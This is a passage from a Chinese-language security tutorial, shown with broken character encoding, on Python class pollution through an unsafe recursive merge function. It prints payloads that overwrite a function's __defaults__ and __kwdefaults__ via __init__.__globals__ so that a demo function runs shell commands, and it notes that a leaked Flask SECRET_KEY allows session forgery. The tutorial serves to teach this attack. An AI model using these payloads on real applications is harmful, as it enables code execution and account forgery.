class="line"></span><br></pre></td></tr></table></figure><p>â€‹å½“ç„¶æˆ‘ä»¬å»ä½¿ç”¨çš„ <code>Payload</code>  ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯ä¸ä¼šè¿™æ ·çš„ï¼Œå¦‚ä¸Šçš„ <code>Payload</code>  å®é™…ä¸Šæ˜¯åœ¨å·²ç» <code>import sys</code>  çš„æƒ…å†µä¸‹ä½¿ç”¨çš„ï¼Œè€Œå¤§éƒ¨åˆ†æƒ…å†µæ˜¯æ²¡æœ‰ç›´æ¥å¯¼å…¥çš„ï¼Œè¿™æ ·é—®é¢˜å°±ä»<strong>å¯»æ‰¾ <code>import</code>  ç‰¹å®šæ¨¡å—çš„è¯­å¥</strong>è½¬æ¢ä¸º<strong>å¯»æ‰¾ <code>import</code>  äº† sys æ¨¡å—çš„è¯­å¥</strong>ï¼Œå¯¹é—®é¢˜è§£å†³çš„å¹¶ä¸è§å¾—æœ‰å¤šå°‘ä¼˜åŒ–</p><h2 id="4-å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢"><a class="markdownIt-Anchor" href="#4-å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢">#</a> 4ã€å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢ï¼š</h2><p>â€‹ä¸»è¦ç”¨åˆ°äº†å‡½æ•°çš„ <code>__defaults__</code> å’Œ <code>__kwdefaults__</code> è¿™ä¸¤ä¸ªå†…ç½®å±æ€§</p><h4 id="__defaults__"><a class="markdownIt-Anchor" href="#__defaults__">#</a>  <code>__defaults__</code> ï¼š</h4><p>â€‹ <code>__defaults__</code> ä»¥å…ƒç»„çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°çš„ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªä½ç½®æˆ–é”®å€¼å½¢å‚æ˜¯ç‰¹å®šçš„ä¸€ç±»å½¢å‚ï¼Œå¹¶ä¸æ˜¯ä½ç½®å½¢å‚ + é”®å€¼å½¢å‚ï¼Œå…³äºå‡½æ•°çš„å‚æ•°åˆ†ç±»å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTIyNzM0NjU=">python å‡½æ•°çš„ä½ç½®å‚æ•° (Positional) å’Œå…³é”®å­—å‚æ•° (keyword) - çŸ¥ä¹ (zhihu.com)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢ï¼Œä½†ç¨æœ‰é—®é¢˜çš„æ˜¯è¯¥å±æ€§å€¼è¦æ±‚ä¸ºå…ƒç»„ç±»å‹ï¼Œè€Œé€šå¸¸çš„å¦‚ <code>JSON</code>  ç­‰æ ¼å¼å¹¶æ²¡æœ‰å…ƒç»„è¿™ä¸€æ•°æ®ç±»å‹è®¾è®¡æ¦‚å¿µï¼Œè¿™å°±éœ€è¦ç¯å¢ƒä¸­æœ‰åˆé€‚çš„è§£æè¾“å…¥çš„æ–¹å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure><h3 id="__kwdefaults__"><a class="markdownIt-Anchor" href="#__kwdefaults__">#</a>  <code>__kwdefaults__</code></h3><p>â€‹ <code>__kwdefaults__</code> ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , * , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure><h2 id="5-secret_key"><a class="markdownIt-Anchor" href="#5-secret_key">#</a> 5ã€SECRET_KEYï¼š</h2><p>â€‹å†³å®š <code>flask</code>  çš„ <code>session</code>  ç”Ÿæˆçš„é‡è¦å‚æ•°ï¼ŒçŸ¥é“è¯¥å‚æ•°å¯ä»¥å®ç° <code>session</code>  ä»»æ„ä¼ªé€ ã€‚</p><h1 id="æœ€åçš„è¡¥å……"><a class="markdownIt-Anchor" href="#æœ€åçš„è¡¥å……">#</a> æœ€åçš„è¡¥å……ï¼š</h1><h2 id="1-mergeå‡½æ•°"><a class="markdownIt-Anchor" href="#1-mergeå‡½æ•°">#</a> 1ã€merge å‡½æ•°</h2><p>â€‹é¦–å…ˆï¼Œåœ¨æœ€å¼€å§‹çœ‹åˆ° merge å‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘å½“æ—¶æ²¡æœ‰ä»”ç»†çœ‹è¿‡è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ï¼Œç°åœ¨æ¥åˆ†æä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆè¯´ä¸€ä¸‹æˆ‘çš„çŸ¥è¯†ç›²åŒºï¼Œç®—æ˜¯å› ä¸ºè¿™ä¸ªï¼Œæˆ‘æ‰çœ‹ä¸æ‡‚è¿™ä¸ªå‡½æ•°çš„æºç çš„å§ã€‚</p><p>â€‹é¦–å…ˆæ˜¯å­—å…¸çš„ items æ–¹æ³•ï¼Œ python ä¸­çš„ items æ˜¯å¯ä»¥å°†å­—å…¸ä¸­çš„æ‰€æœ‰é¡¹ï¼Œä»¥åˆ—è¡¨æ–¹å¼è¿”å›ã€‚å¤§æ¦‚æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.items())</span><br><span class="line"></span><br><span class="line"><span class="comment">#dict_items([(&#x27;a&#x27;, &#x27;1&#x27;), (&#x27;b&#x27;, &#x27;2&#x27;), (&#x27;c&#x27;, &#x27;123&#x27;)])</span></span><br></pre></td></tr></table></figure><p>â€‹å…¶æ¬¡å°±æ˜¯ hasattr () å‡½æ•°ï¼š <code>hasattr()</code>  æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å¯¹è±¡æ˜¯å¦å…·æœ‰ç»™å®šçš„å±æ€§ã€‚è¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ£€æŸ¥çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æŸ¥æ‰¾çš„å±æ€§åç§°ã€‚å¦‚æœå¯¹è±¡å…·æœ‰è¯¥å±æ€§ï¼Œåˆ™  <code>hasattr()</code>  å‡½æ•°è¿”å›  <code>True</code> ï¼Œå¦åˆ™è¿”å›  <code>False</code> ã€‚å¤§æ¦‚æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(a,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæ˜¯ <code>__getitem__</code> å±æ€§ï¼šåœ¨ Python ä¸­ï¼Œ <code>__getitem__</code>  æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œç”¨äºå®šä¹‰å¯¹è±¡çš„ç´¢å¼•è®¿é—®è¡Œä¸ºã€‚å®ƒä½¿å¾—å¯¹è±¡å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·  <code>[]</code>  è¿›è¡Œ<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclQjQlQTIlRTUlQkMlOTUlRTYlOTMlOEQlRTQlQkQlOUMmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">ç´¢å¼•æ“ä½œ</span>ï¼Œç±»ä¼¼äºåˆ—è¡¨ã€å…ƒç»„å’Œå­—å…¸ç­‰å†…ç½®å®¹å™¨ç±»å‹ã€‚</p><p><strong>å¤§è‡´ä¸Šï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå±æ€§æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æŸä¸ªå¯¹è±¡æ˜¯å¦ä¸ºå­—å…¸ï¼Œä¸è¿‡ä¸èƒ½å‡†ç¡®ç¡®å®šä¸‹æ¥ã€‚</strong></p><p>â€‹å†ä¹‹åæ˜¯å­—å…¸çš„ get æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯è·å–å­—å…¸ä¸­æŒ‡å®šé”®çš„å€¼ï¼Œå…·ä½“ä¸åšæ¼”ç¤ºã€‚</p><p>â€‹æœ€åï¼šsetattr () å‡½æ•°çš„åŠŸèƒ½ç›¸å¯¹æ¯”è¾ƒå¤æ‚ï¼Œå®ƒæœ€åŸºç¡€çš„åŠŸèƒ½æ˜¯<strong>ä¿®æ”¹ç±»å®ä¾‹å¯¹è±¡ä¸­çš„å±æ€§å€¼</strong>ã€‚å…¶æ¬¡ï¼Œå®ƒè¿˜å¯ä»¥å®ç°<strong>ä¸ºå®ä¾‹å¯¹è±¡åŠ¨æ€æ·»åŠ å±æ€§æˆ–è€…æ–¹æ³•</strong>ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;321&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#123</span></span><br><span class="line"><span class="comment">#321</span></span><br></pre></td></tr></table></figure><p>â€‹å¥½äº†ï¼Œç”¨ä¸‹é¢è¿™ä¸ªåšä¸‹æµ‹è¯•ï¼Œåœ¨å‡½æ•°é‡Œä¸‹ä¸€ä¸ªæ–­å®šï¼Œæ¥è°ƒè¯•çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">c = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">merge(a,c)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>â€‹æœ€å¼€å§‹çš„æ—¶å€™ï¼Œkï¼Œv åˆ†åˆ«è·å–äº† a å’Œ 1 è¿™ä¸¤ä¸ªå­—ç¬¦ï¼Œç„¶åç»§ç»­å‘åæ‰§è¡Œï¼Œå½“å‡½æ•°æ‰§è¡Œåˆ° <code>if hasattr(dst, '__getitem__'):</code>  çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æœ‰ <code>__getitem__</code> å±æ€§ï¼Œåˆ™å¤§è‡´åˆ¤æ–­è¿™ä¸ªæ˜¯ä¸ªå­—å…¸ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åˆ¤æ–­ç›®æ ‡å­—å…¸é‡Œæ˜¯å¦å­˜åœ¨ a è¿™ä¸€ä¸ªå±æ€§ï¼Œä»¥åŠæ˜¯å¦ä¸ºå­—å…¸ï¼Œå¦‚æœæ˜¯å­—å…¸ï¼Œåˆ™é€’å½’è°ƒç”¨ï¼Œå¦‚æœä¸æ˜¯å­—å…¸ï¼Œåˆ™æ‰§è¡Œ else é‡Œé¢çš„è¯­å¥ï¼Œè®¾ç½®ä¸€ä¸ªå…¨æ–°çš„å±æ€§åœ¨åé¢ã€‚åœ¨è¿™é‡Œå› ä¸ºç›®æ ‡å­—å…¸åªæœ‰ c å­—æ®µï¼Œä½†æ˜¯æºå¯¹è±¡æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ ifï¼Œè¿›è€Œè®¾ç½®ä¸€ä¸ªæ–°çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯æˆåŠŸåŠ è¿›å»äº†ã€‚</p><p>â€‹ <code>if dst.get(k) and type(v) == dict:</code>  è¿™ä¸€è¡Œï¼Œæ£€æŸ¥ç›®æ ‡å­—å…¸çš„ k é”®ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡è¿›å…¥æ—¶è¿­ä»£è·å–åˆ°çš„ a å±æ€§ï¼Œç›®æ ‡æ˜¯ç¡®è®¤ a å±æ€§æ˜¯å¦æœ‰å€¼ï¼ŒåŒæ—¶åˆ¤æ–­ k æ˜¯å¦ä¸ºå­—å…¸ï¼Œå¦‚æœ k æ˜¯å­—å…¸ï¼Œå°±é€’å½’æ‰§è¡Œã€‚</p><p><strong>å¤§æ¦‚å°±æ˜¯è¿™æ ·çš„ï¼Œå¯èƒ½ä¸ç®—å¾ˆè¯¦ç»†å§ï¼Œè¿™ä¸ªåªæœ‰è‡ªå·±æ‰“æ–­ç‚¹è°ƒè¯•æ‰èƒ½çœ‹å‡ºæ¥å§ã€‚</strong><br>â€‹</p><h2 id="2-pydashçš„set_å‡½æ•°æºç ä¿¡æ¯"><a class="markdownIt-Anchor" href="#2-pydashçš„set_å‡½æ•°æºç ä¿¡æ¯">#</a> 2ã€pydash çš„ set_å‡½æ•°æºç ä¿¡æ¯ï¼š</h2><p>â€‹æ— å¯å¥ˆä½•ä¹‹ä¸‹ï¼Œ è¿™é‡Œé€‰æ‹©å…ˆå®¡ä»¥ä¸‹ set_çš„æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 